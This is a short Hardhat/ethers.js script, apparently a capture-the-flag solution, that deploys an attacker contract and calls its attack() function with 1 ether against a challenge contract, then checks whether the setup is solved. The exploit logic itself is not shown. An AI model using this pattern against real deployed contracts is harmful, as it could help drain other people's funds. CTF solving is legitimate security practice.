const { parseEther } = require("ethers/lib/utils");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("sidduHEREAttacker");

  const setup = await ethers.getContractAt( "Setup", "0x76BB80b4F1bA62eD2665f537f605C3593daCc458" );
  const ctf = await ethers.getContractAt( "ExampleQuizExploit", "0x43c3E684cfCD27083f7156E7d883FC7e449e1c59" );

  console.log("solved:", await setup.isSolved());

  const exploit = await EXPLOIT.deploy();
  await exploit.attack(ctf.address, { value: parseEther("1") });


  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
